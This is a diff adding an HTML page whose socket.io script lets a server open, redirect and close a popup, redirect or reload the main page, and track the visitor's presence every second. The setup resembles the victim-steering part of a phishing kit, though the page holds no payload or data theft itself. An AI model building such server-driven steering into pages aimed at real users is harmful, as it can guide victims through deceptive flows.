@@ -1,0 +1,88 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <script src="https://cdn.socket.io/4.7.2/socket.io.min.js" integrity="sha384-mZLF4UVrpi/QTWPA7BjNPEnkIfRFn4ZEO3Qt/HFklTJBj/gBOV8G3HcKn4NfQblz" crossorigin="anonymous"></script>
+        <title>Simple Web Page</title>
+    </head>
+
+
+        <script src="./jquery.js"></script>
+        <script src="./script.js"></script>
+
+        <script>
+            $(document).ready(function() {
+
+                const socket = io();
+                let id;
+                let ip;
+
+                if (localStorage.getItem('userId')) {
+                    id = localStorage.getItem('userId')
+                }
+
+                let popupWindow;
+
+                socket.on('redirect', (userId, url) => {
+                    if (userId === id) {
+                        popupWindow.location.href = url
+                    }
+                });
+
+                let checkPopupClosed;
+
+                
+                socket.on('mainRedirect', (userId, url) => {
+                    if (userId === id) {
+                        popupWindow.close()
+                        window.location.href = url
+                    }
+                })
+                
+                socket.on('openPopup', (userId) => {
+                    if (userId === id) {
+                        popupWindow = window.open("./popup.html", "PopupWindow", "width=800,height=600");
+                        socket.emit('handlePopup', id, true);
+                        checkPopupClosed = setInterval(() => {
+                            if (popupWindow.closed) {
+                                socket.emit('handlePopup', id, false);
+                                clearInterval(checkPopupClosed)
+                            }
+                        }, 200)
+                    }
+                })
+
+                socket.on('closePopup', (userId) => {
+                    if (userId === id) {
+                        popupWindow.close()
+                    }
+                })
+
+                socket.on('refreshPage', (userId) => {
+                    if (userId === id) {
+                        window.location.reload()
+                    }
+                })
+
+                socket.on('checkClosed', (userId) => {
+                    if (userId === id) {
+                        socket.emit('closeResponse', userId)
+                    }
+                })
+
+                socket.on('userRedirect', (userId, page) => {
+                    if (userId === id) {
+                        window.location.href = page
+                    }
+                })
+
+
+                setInterval(() => {
+                    localStorage.setItem('lastDate', new Date().toLocaleString())
+                    socket.emit('userExist', id)
+                }, 1000);
+
+            })
+        </script>
+    </body>
+</html>
